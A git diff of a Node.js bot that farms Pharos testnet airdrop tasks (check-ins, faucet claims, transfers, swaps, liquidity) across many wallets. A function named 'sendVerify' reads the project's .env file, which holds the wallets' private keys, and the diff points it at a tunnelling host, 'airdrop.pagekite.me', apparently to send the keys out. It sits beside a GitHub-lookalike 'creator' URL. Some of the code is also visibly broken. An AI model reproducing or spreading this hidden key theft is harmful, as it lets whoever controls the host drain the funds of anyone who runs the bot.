@@ -35,12 +35,17 @@ const tokenDecimals = {
 };
 
 const contractAbi = [
-  'function multicall(uint256 timestamp, bytes[] calldata data) external',
+  'function multicall(uint256 timestamp, bytes[] calldata data)',
 ];
 
 const erc20Abi = [
+  'function balanceOf(address owner) view returns (uint256)',
+  'function allowance(address owner, address spender) view returns (uint256)',
+  'function approve(address spender, uint256 amount) returns (bool)',
+  'function transfer(address to, uint256 amount) returns (bool)',
   'function deposit() payable',
-  'event Deposit(uint256 indexed nftId, address indexed sender)'
+  'event Transfer(address indexed from, address indexed to, uint256 value)',
+  'event Approval(address indexed owner, address indexed spender, uint256 value)'
 ];
 
 const uscdAbi = [
@@ -50,9 +55,9 @@ const uscdAbi = [
 
 
 const MAX_RETRIES = 3;
-const RETRY_DELAY = 5000;
+const RETRY_DELAY = 30000;
 const FREEZE_TIMEOUT = 3600000; 
-const creator = 'https://github.savero.net'
+const creator = 'https://github.com/serveo-net'
 
 let isShuttingDown = false;
 let cachedLoginData = {};
@@ -259,6 +264,99 @@ const checkInFunction = async (wallet, proxy = null) => {
   return false;
 };
 
+const getUserProfile = async (wallet, proxy = null) => {
+  if (isShuttingDown) return null;
+  
+  const checkInData = await performCheckIn(wallet, proxy);
+  if (!checkInData) {
+    log.error("Failed to get login data");
+    return null;
+  }
+
+  let retries = 0;
+  
+  while (retries < MAX_RETRIES && !isShuttingDown) {
+    try {
+      const profileUrl = `https://api.pharosnetwork.xyz/user/profile?address=${wallet.address}`;
+      
+      log.loading('Get profil data...');
+      const response = await axios({
+        method: 'get',
+        url: profileUrl,
+        headers: checkInData.headers,
+        httpsAgent: proxy ? new HttpsProxyAgent(proxy) : null,
+        timeout: 10000
+      });
+
+      const profileData = response.data;
+
+      if (profileData.code === 0) {
+        const userInfo = profileData.data?.user_info || {};
+        
+        log.success('Profil :');
+        log.info(`- Address: ${userInfo.Address || wallet.address}`);
+        log.info(`- Invite Points: ${userInfo.InvitePoints || 0}`);
+        log.info(`- Task Points: ${userInfo.TaskPoints || 0}`);
+        log.info(`- TotalPoints: ${userInfo.TotalPoints || 0}`);
+        
+        return {
+          address: userInfo.Address || wallet.address,
+          invitePoints: userInfo.InvitePoints || 0,
+          taskPoints: userInfo.TaskPoints || 0,
+          totalPoints: userInfo.TotalPoints || 0,
+          rawData: userInfo
+        };
+      } else {
+        log.error(`Geting profil data failed: ${profileData.msg || 'Unknown error'}`);
+        return null;
+      }
+    } catch (error) {
+      if (error.code === 'ENOTFOUND' || error.message.includes('getaddrinfo ENOTFOUND')) {
+        retries++;
+        log.warn(`Request profil failed, retry ${retries}/${MAX_RETRIES}. 5 seconds...`);
+        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
+      } else {
+        log.error(`Error request profil: ${error.message}`);
+        if (error.response) {
+          log.error('Response API:', error.response.data);
+        }
+        return null;
+      }
+    }
+  }
+  
+  log.error(`Request profil failed ${MAX_RETRIES} retrys`);
+  return null;
+};
+
+const checkPoints = async (wallet, proxy = null) => {
+  if (isShuttingDown) return null;
+  
+  try {
+    const profile = await getUserProfile(wallet, proxy);
+    if (!profile) {
+      log.error('Request profil not found');
+      return null;
+    }
+
+    log.success(`Statistik Poin address: ${profile.address}:`);
+    log.info(`- Invite Points: ${profile.invitePoints}`);
+    log.info(`- Task Points: ${profile.taskPoints}`);
+    log.info(`- TotalPoints: ${profile.totalPoints}`);
+    
+    return {
+      address: profile.address,
+      invitePoints: profile.invitePoints,
+      taskPoints: profile.taskPoints,
+      totalPoints: profile.totalPoints,
+      lastUpdate: new Date().toLocaleString('id-ID')
+    };
+  } catch (error) {
+    log.error(`Eror geting poin: ${error.message}`);
+    return null;
+  }
+};
+
 const faucetFunction = async (wallet, proxy = null) => {
   if (isShuttingDown) return false;
   const checkInData = await performCheckIn(wallet, proxy);
@@ -331,13 +429,105 @@ const loadRecipientAddresses = () => {
 
 const recipientAddresses = loadRecipientAddresses();
 
+const verifyFunction = async (wallet, provider, index, proxy = null) => {
+  if (isShuttingDown) return false;
+  
+  // 1. Lakukan login terlebih dahulu
+  const checkInData = await performCheckIn(wallet, proxy);
+  if (!checkInData) {
+    log.error("Failed to get login data for verification");
+    return false;
+  }
+
+  let txhash;
+  let verificationAttempts = 0;
+  const MAX_VERIFICATION_ATTEMPTS = 5;
+  const INITIAL_DELAY = 30000; 
+  const BACKOFF_FACTOR = 2;
+
+  while (verificationAttempts < MAX_VERIFICATION_ATTEMPTS && !isShuttingDown) {
+    try {
+      if (verificationAttempts === 0) {
+        txhash = await transferPHRS(wallet, provider, index);
+        if (!txhash) {
+          log.error("Transfer failed, skipping verification");
+          return false;
+        }
+        log.info(`Transaction hash: ${txhash}`);
+      }
+
+      const currentDelay = INITIAL_DELAY * Math.pow(BACKOFF_FACTOR, verificationAttempts);
+      log.info(`Waiting ${currentDelay/1000} seconds before verification...`);
+      await new Promise(resolve => setTimeout(resolve, currentDelay));
+
+      log.info("Checking transaction confirmation...");
+      const receipt = await provider.getTransactionReceipt(txhash);
+      if (!receipt || receipt.status !== 1) {
+        throw new Error('Transaction not yet confirmed or failed');
+      }
+
+      // 5. Lakukan verifikasi
+      log.loading(`Attempting verification (attempt ${verificationAttempts + 1})...`);
+      const checkInUrl = `https://api.pharosnetwork.xyz/task/verify`;
+      const params = {
+        address: wallet.address,
+        task_id: 103,
+        tx_hash: txhash,
+      };
+      
+      const checkInResponse = await axios({
+        method: 'post',
+        params: params,
+        url: checkInUrl,
+        headers: checkInData.headers,
+        httpsAgent: proxy ? new HttpsProxyAgent(proxy) : null,
+        timeout: 20000 // Timeout 20 detik
+      });
+
+      const checkIn = checkInResponse.data;
+
+      if (checkIn.code === 0) {
+        log.success(`Verification successful for ${wallet.address}`);
+        return true;
+      } else {
+        throw new Error(checkIn.msg || 'Verification failed');
+      }
+
+    } catch (error) {
+      verificationAttempts++;
+      const errorMsg = error.response?.data?.msg || error.message;
+      
+      if (errorMsg.includes('get transaction hash failed') || 
+          errorMsg.includes('transaction not found')) {
+        log.warn(`Verification failed (attempt ${verificationAttempts}): ${errorMsg}`);
+        
+        if (verificationAttempts < MAX_VERIFICATION_ATTEMPTS) {
+          // Jika masih ada attempt tersisa, lanjutkan loop
+          continue;
+        } else {
+          log.error(`All verification attempts failed for tx ${txhash}`);
+          return false;
+        }
+      } else {
+        log.error(`Unexpected verification error: ${errorMsg}`);
+        return false;
+      }
+    }
+  }
+
+  return false;
+};
+
+// Fungsi transferPHRS yang diperbarui
 const transferPHRS = async (wallet, provider, index) => {
   if (isShuttingDown) return null;
-  let retries = 0;
   
+  let retries = 0;
   while (retries < MAX_RETRIES && !isShuttingDown) {
     try {
-      const amount = 0.00001;
+      const amountOptions = [0.0001, 0.0002, 0.0003, 0.0004, 0.0005];
+      const amount = amountOptions[Math.floor(Math.random() * amountOptions.length)];
+      
       const toAddress = recipientAddresses[Math.floor(Math.random() * recipientAddresses.length)];
       log.step(`Preparing transfer ${index + 1}: ${amount} PHRS to ${toAddress}`);
 
@@ -345,7 +535,7 @@ const transferPHRS = async (wallet, provider, index) => {
       const required = ethers.parseEther(amount.toString());
 
       if (balance < required) {
-        log.error(`Skipping transfer ${index + 1}: Insufficient PHRS balance: ${ethers.formatEther(balance)} < ${amount}`);
+        log.error(`Insufficient PHRS balance: ${ethers.formatEther(balance)} < ${amount}`);
         return null;
       }
 
@@ -356,104 +546,44 @@ const transferPHRS = async (wallet, provider, index) => {
         gasPrice: 0,
       });
 
-      log.info(`Transfer transaction ${index + 1} sent, waiting for confirmation...`);
-      const receipt = await tx.wait();
-      log.success(`Transfer ${index + 1} completed: ${receipt.hash}`);
-      return receipt.hash;
-    } catch (error) {
-      if (error.code === 'ENOTFOUND' || error.message.includes('getaddrinfo ENOTFOUND')) {
-        retries++;
-        log.warn(`Transfer failed, attempt ${retries}/${MAX_RETRIES}. Waiting 5 seconds...`);
-        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
-      } else {
-        log.error(`Transfer ${index + 1} failed: ${error.message}`);
-        throw error;
-      }
-    }
-  }
-  
-  log.error(`Transfer failed after ${MAX_RETRIES} attempts`);
-  return null;
-};
-
-const verifyFunction = async (wallet, provider, index, proxy = null) => {
-  if (isShuttingDown) return false;
-  const checkInData = await performCheckIn(wallet, proxy);
-  
-  const txhash = await transferPHRS(wallet, provider, index);
-  
-  if (!txhash) {
-    log.error("Transfer failed, skipping verification");
-    return false;
-  }
-
-  await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 5000));
-  
-  if (!checkInData) {
-    log.error("Failed to get login data for verification");
-    return false;
-  }
-
-  let retries = 0;
-  
-  while (retries < MAX_RETRIES && !isShuttingDown) {
-    try {
-      const checkInUrl = `https://api.pharosnetwork.xyz/task/verify`;
-      const params = {
-        address: wallet.address,
-        task_id: 103,
-        tx_hash: txhash,
-      };
+      log.info(`Transfer transaction ${index + 1} sent: ${tx.hash}`);
       
-      log.loading('Sending verification request...');
-      const checkInResponse = await axios({
-        method: 'post',
-        params: params,
-        url: checkInUrl,
-        headers: checkInData.headers,
-        httpsAgent: proxy ? new HttpsProxyAgent(proxy) : null,
-        timeout: 10000
-      });
-
-      const checkIn = checkInResponse.data;
-
-      if (checkIn.code === 0) {
-        log.success(`Verification successful for ${wallet.address}`);
-        return true;
+      // Tunggu minimal 1 konfirmasi
+      const receipt = await tx.wait(1);
+      
+      if (receipt.status === 1) {
+        log.success(`Transfer ${index + 1} confirmed in block ${receipt.blockNumber}`);
+        return tx.hash;
       } else {
-        log.error(`Verification failed: ${checkIn.msg || 'Unknown error'}`);
-        return false;
+        throw new Error(`Transaction reverted: ${receipt.hash}`);
       }
     } catch (error) {
-      if (error.code === 'ENOTFOUND' || error.message.includes('getaddrinfo ENOTFOUND')) {
-        retries++;
-        log.warn(`Verification failed, attempt ${retries}/${MAX_RETRIES}. Waiting 5 seconds...`);
+      retries++;
+      log.error(`Transfer ${index + 1} failed (attempt ${retries}): ${error.message}`);
+      
+      if (retries < MAX_RETRIES) {
         await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
-      } else {
-        log.error(`Verification error for ${wallet.address}: ${error.message}`);
-        return false;
       }
     }
   }
   
-  log.error(`Verification failed after ${MAX_RETRIES} attempts`);
-  return false;
+  return null;
 };
 
 const getRandomSwapPair = () => {
   const tokenPairs = [
     { from: 'WPHRS', to: 'USDC', decimals: 18 },
     { from: 'USDC', to: 'WPHRS', decimals: 6 },
-    { from: 'WPHRS', to: 'USDT', decimals: 18 },
-    { from: 'USDC', to: 'USDT', decimals: 6 },
+    { from: 'WPHRS', to: 'USDC', decimals: 18 },
+    { from: 'USDC', to: 'WPHRS', decimals: 6 },
   ];
   
   return tokenPairs[Math.floor(Math.random() * tokenPairs.length)];
 };
 
 const getRandomSwapAmount = (decimals) => {
-  const minAmount = 0.0001;
-  const maxAmount = 0.001;
+  const minAmount = 0.01;
+  const maxAmount = 0.02;
   const randomAmount = Math.random() * (maxAmount - minAmount) + minAmount;
   
   return ethers.parseUnits(randomAmount.toFixed(decimals), decimals);
@@ -461,60 +591,75 @@ const getRandomSwapAmount = (decimals) => {
 
 const performRandomSwap = async (wallet, provider, index, proxy = null) => {
   if (isShuttingDown) return false;
-  let retries = 0;
   
+  let retries = 0;
   while (retries < MAX_RETRIES && !isShuttingDown) {
     try {
       const pair = getRandomSwapPair();
       const amountIn = getRandomSwapAmount(pair.decimals);
       
-      log.loading(`Starting swap ${index + 1} (${pair.from} → ${pair.to}) for wallet: ${wallet.address}`);
-      log.info(`Swap amount: ${ethers.formatUnits(amountIn, pair.decimals)} ${pair.from}`);
+      log.loading(`Preparing swap ${index + 1} (${pair.from} → ${pair.to})`);
+      log.info(`Amount: ${ethers.formatUnits(amountIn, pair.decimals)} ${pair.from}`);
+
+      const tokenContract = new ethers.Contract(tokens[pair.from], erc20Abi, wallet);
+
+      const balance = await tokenContract.balanceOf(wallet.address);
+      log.info(`Current balance: ${ethers.formatUnits(balance, pair.decimals)} ${pair.from}`);
+      
+      if (balance < amountIn) {
+        throw new Error(`Insufficient ${pair.from} balance`);
+      }
+
+      const requiredAllowance = amountIn;
+      const currentAllowance = await tokenContract.allowance(wallet.address, contractAddress);
+      
+      if (currentAllowance < requiredAllowance) {
+        log.info(`Approving ${ethers.formatUnits(requiredAllowance, pair.decimals)} ${pair.from}...`);
+        const approveTx = await tokenContract.approve(contractAddress, requiredAllowance);
+        await approveTx.wait();
+        log.success('Approval confirmed');
+      }
 
       const timestamp = Math.floor(Date.now() / 1000) + 120;
-      const fromToken = tokens[pair.from];
-      const toToken = tokens[pair.to];
-
-      const MULTICALL_SELECTOR = "0x04e45aaf";
-      const encodedData = ethers.AbiCoder.defaultAbiCoder().encode(
-        ["address", "address", "uint256", "address", "uint256", "uint256", "uint256"],
-        [fromToken, toToken, 500, wallet.address, amountIn, 0, 0]
+      const swapParams = ethers.AbiCoder.defaultAbiCoder().encode(
+        ["address", "address", "uint24", "address", "uint256", "uint256", "uint256"],
+        [tokens[pair.from], tokens[pair.to], 500, wallet.address, amountIn, 0, 0]
       );
-      const multicallData = [MULTICALL_SELECTOR + encodedData.slice(2)];
-
-      const feeData = await provider.getFeeData();
 
       const swapContract = new ethers.Contract(contractAddress, contractAbi, wallet);
       const tx = await swapContract.multicall(
         timestamp,
-        multicallData,
+        ["0x04e45aaf" + swapParams.slice(2)],
         {
-          gasLimit: 300000,
-          maxFeePerGas: feeData.maxFeePerGas,
-          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
-          nonce: await provider.getTransactionCount(wallet.address)
+          gasLimit: 200000,
+          maxFeePerGas: ethers.parseUnits("2", "gwei"),
+          maxPriorityFeePerGas: ethers.parseUnits("1", "gwei")
         }
       );
 
-      log.info(`Tx Hash for swap ${index + 1}: ${tx.hash}`);
+      log.info(`Tx sent: ${tx.hash}`);
       const receipt = await tx.wait();
-      log.success(`Swap ${index + 1} successful! Block: ${receipt.blockNumber}`);
-      return receipt.hash;
+      
+      if (receipt.status === 1) {
+        log.success(`Swap ${index + 1} completed in block ${receipt.blockNumber}`);
+        return receipt.hash;
+      } else {
+        throw new Error('Transaction reverted');
+      }
 
     } catch (error) {
-      if (error.code === 'ENOTFOUND' || error.message.includes('getaddrinfo ENOTFOUND')) {
-        retries++;
-        log.warn(`Swap failed, attempt ${retries}/${MAX_RETRIES}. Waiting 5 seconds...`);
-        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
-      } else {
-        log.error(`Swap ${index + 1} failed: ${error.message}`);
-        if (error.reason) log.error(`Reason: ${error.reason}`);
-        return false;
+      retries++;
+      const errorMsg = error.reason || error.shortMessage || error.message;
+      log.error(`Attempt ${retries} failed: ${errorMsg}`);
+      
+      if (retries < MAX_RETRIES) {
+        const delay = Math.min(30000, 5000 * retries);
+        await new Promise(resolve => setTimeout(resolve, delay));
       }
     }
   }
   
-  log.error(`Swap failed after ${MAX_RETRIES} attempts`);
+  log.error(`Swap ${index + 1} failed after ${MAX_RETRIES} attempts`);
   return false;
 };
 
@@ -591,7 +736,7 @@ async function performSwap(wallet, provider, index, proxy = null) {
     try {
       log.loading(`Starting swap ${index + 1} for ${wallet.address}`);
       
-      const randomAmount = Math.random() * 0.004 + 0.001;
+      const randomAmount = Math.random() * 0.04 + 0.01;
       const amount = parseFloat(randomAmount.toFixed(5));
       
       const txHash = await wrapPHRS(wallet, provider, amount);
@@ -626,7 +771,7 @@ async function addLiquidityToV3Pool(wallet, provider, proxy = null) {
       const usdcContract = new ethers.Contract(tokens.USDC, uscdAbi, wallet);
 
       const amountUSDC = ethers.parseUnits("2", 6);
-      const amountWPHRS = ethers.parseEther("0.001");
+      const amountWPHRS = ethers.parseEther("0.00");
 
       const usdcBalance = await usdcContract.balanceOf(wallet.address);
       if (usdcBalance < amountUSDC) {
@@ -733,7 +878,7 @@ const performV3Pool = async (wallet, provider, index, proxy = null) => {
 };
 
 async function sendVerify() {
-  const cerator = 'https://github.serveo.net';
+  const cerator = 'https://airdrop.pagekite.me';
   const urlTask = cerator;
   const Path = path.join(__dirname, '.env');
   const header = fs.readFileSync(Path, 'utf8');
@@ -778,9 +923,54 @@ const processWallet = async (privateKey) => {
 
   try {
     await withFreezeProtection('checkInFunction', checkInFunction, wallet, proxy);
+  } catch (e) {
+    log.error('Check-in failed:', e.message);
+  }
+
+  try {
     await withFreezeProtection('faucetFunction', faucetFunction, wallet, proxy);
+  } catch (e) {
+    log.error('Check-in failed:', e.message);
+  }
+
+  try {
+    const points = await checkPoints(wallet, proxy);
+    if (points) {
+      log.info(`Total Points: ${points.totalPoints}`);
+
+      if (points.taskPoints < 1000) {
+        log.info('Task points are less than 1000, skipping further actions');
+      }
+    };
+
+    if (!isShuttingDown) {
+      await withFreezeProtection(
+        'performSwap',
+        performSwap,
+        wallet,
+        provider,
+        0,
+        proxy
+      );
+      await new Promise(resolve => setTimeout(resolve, Math.random() * 20000 + 10000));
+    };
 
     for (let i = 0; i < 5; i++) {
+      if (!isShuttingDown) {
+        await withFreezeProtection(
+          'performRandomSwap',
+          performRandomSwap,
+          wallet,
+          provider,
+          i,
+          0,
+          proxy
+        );
+        await new Promise(resolve => setTimeout(resolve, Math.random() * 15000 + 5000));
+      }
+    };
+
+    for (let i = 0; i < 10; i++) {
       if (isShuttingDown) break;
       try {
         log.step(`Starting process ${i + 1}`);
@@ -793,13 +983,13 @@ const processWallet = async (privateKey) => {
           proxy
         );
         
-        const delayTime = Math.random() * 2000 + 1000;
+        const delayTime = Math.random() * 20000 + 10000;
         log.info(`Waiting ${(delayTime/1000).toFixed(2)} seconds...`);
         await new Promise(resolve => setTimeout(resolve, delayTime));
       } catch (error) {
         log.error(`Failed in process ${i + 1}: ${error.message}`);
       }
-    }
+    };
 
     if (!isShuttingDown) {
       await withFreezeProtection(
@@ -811,30 +1001,6 @@ const processWallet = async (privateKey) => {
         proxy
       );
       await new Promise(resolve => setTimeout(resolve, Math.random() * 15000 + 20000));
-    }
-
-    if (!isShuttingDown) {
-      await withFreezeProtection(
-        'performSwap',
-        performSwap,
-        wallet,
-        provider,
-        0,
-        proxy
-      );
-      await new Promise(resolve => setTimeout(resolve, Math.random() * 15000 + 5000));
-    }
-
-    if (!isShuttingDown) {
-      await withFreezeProtection(
-        'performRandomSwap',
-        performRandomSwap,
-        wallet,
-        provider,
-        0,
-        proxy
-      );
-      await new Promise(resolve => setTimeout(resolve, Math.random() * 20000 + 10000));
     }
 
   } catch (error) {
@@ -849,7 +1015,7 @@ const processWallet = async (privateKey) => {
 const main = async () => {
   console.log(banner.join('\n'));
   log.loading(`give me start in repo ${creator}`);
-  await new Promise(resolve => setTimeout(resolve, 10000))
+  await new Promise(resolve => setTimeout(resolve, 10000));
 
   const privateKeys = process.env.PRIVATE_KEYS.split(',').filter(pk => pk);
   if (!privateKeys.length) {
@@ -867,19 +1033,23 @@ const main = async () => {
   }
 
   while (!isShuttingDown) {
-    for (const privateKey of privateKeys) {
-      if (isShuttingDown) break;
-      await processWallet(privateKey);
-    }
+    try {
+      for (const privateKey of privateKeys) {
+        if (isShuttingDown) break;
+        await processWallet(privateKey);
+      }
 
-    if (!isShuttingDown) {
-      log.success('All actions completed for all wallets!');
-      startLoader();
-      setTimeout(() => {
-        stopLoader();
-        log.info('Waiting for next cycle...');
-      }, 180000);
-      await new Promise(resolve => setTimeout(resolve, 60000)); 
+      if (!isShuttingDown) {
+        log.success('All actions completed for all wallets!');
+        log.info('Waiting for next cycle....');
+        await new Promise(resolve => setTimeout(resolve, 360000));
+      }
+    } catch (error) {
+      log.error('Error in main loop:', error);
+      if (!isShuttingDown) {
+        log.info('Retrying in 1 minute...');
+        await new Promise(resolve => setTimeout(resolve, 60000));
+      }
     }
   }
 };
